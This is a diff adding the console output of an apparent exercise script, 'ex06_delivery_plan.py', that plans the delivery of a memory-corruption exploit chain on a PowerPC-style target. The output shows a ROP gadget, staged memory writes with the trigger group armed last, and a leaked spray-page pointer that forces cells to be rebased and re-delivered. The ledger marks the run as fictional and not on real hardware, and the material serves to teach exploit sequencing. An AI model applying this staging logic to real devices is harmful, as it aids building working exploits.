@@ -1,0 +1,47 @@
+$ python3 ex06_delivery_plan.py
+---- part 1: stage, confirm, refuse, arm ----
+gadgets:
+  0x40001000: lwz r0, 0x0(r31); mtlr r0; lwz r30, 0x4(r31); lwz r31, 0x8(r31); blr
+stage(): every resolved non-ARM cell, in Deliver order (NORMAL < LATE)
+group 1 [NORMAL] 2 cells
+  0x40600004 <- 40600020
+  0x40600020 <- 00000003
+group 2 [LATE] 1 cells
+  0x40600028 <- 00001000
+refused (unconfirmed): finalize() refused: unconfirmed groups [1, 2]
+refused (unresolved): finalize() refused: unresolved symbols ['probe_addr']
+late bind, then finalize(): fixup groups first, the ARM group LAST
+group 3 [NORMAL] 1 cells
+  0x40600024 <- 40007c00
+group 4 [ARM] 1 cells
+  0x40600000 <- 40003000
+ledger: append-only, in memory; plan.ledger.save(path) writes the JSONL a CI job archives
+  {"ev": "bind", "real_hw": false, "source": "fiction: staging page", "sym": "staging_va", "value": "0x40600000"}
+  {"ev": "bind", "real_hw": false, "source": "live-probe", "sym": "probe_addr", "value": "0x40007c00"}
+  {"ev": "arm_intent", "gid": 4, "real_hw": false}
+  {"ev": "finalize", "n_groups": 2, "real_hw": false}
+
+---- part 2: the leak moves the base mid-delivery ----
+step 1: stage against the PREDICTED base, confirm -- 'delivered'
+group 1 [NORMAL] 2 cells
+  0x40610000 <- 40001000
+  0x40610004 <- 40200000
+
+step 2: the real leak lands -- the prediction was off by +0x1000
+leak: MPKT status reply carries the spray page pointer: 0x40611000
+ledger: stale sym=spray_va cells=2 old=0x40610000 new=0x40611000
+plan.stale: spray+0x0 confirmed @0x40610000 -> now resolves @0x40611000
+plan.stale: spray+0x4 confirmed @0x40610004 -> now resolves @0x40611004
+
+step 3: stage() re-yields the invalidated cells; finalize() still refuses
+group 2 [NORMAL] 2 cells
+  0x40611000 <- 40001000
+  0x40611004 <- 40200000
+  re-yield spray+0x0: 0x40610000 -> 0x40611000
+  re-yield spray+0x4: 0x40610004 -> 0x40611004
+refused (re-delivery unconfirmed): finalize() refused: unconfirmed groups [2]
+
+step 4: confirm the re-delivery, then finalize -- ARM last, new address
+group 3 [ARM] 1 cells
+  0x40611010 <- 00000001
+the trigger never aimed at the stale base: delivered-ness is keyed on (address, bytes)
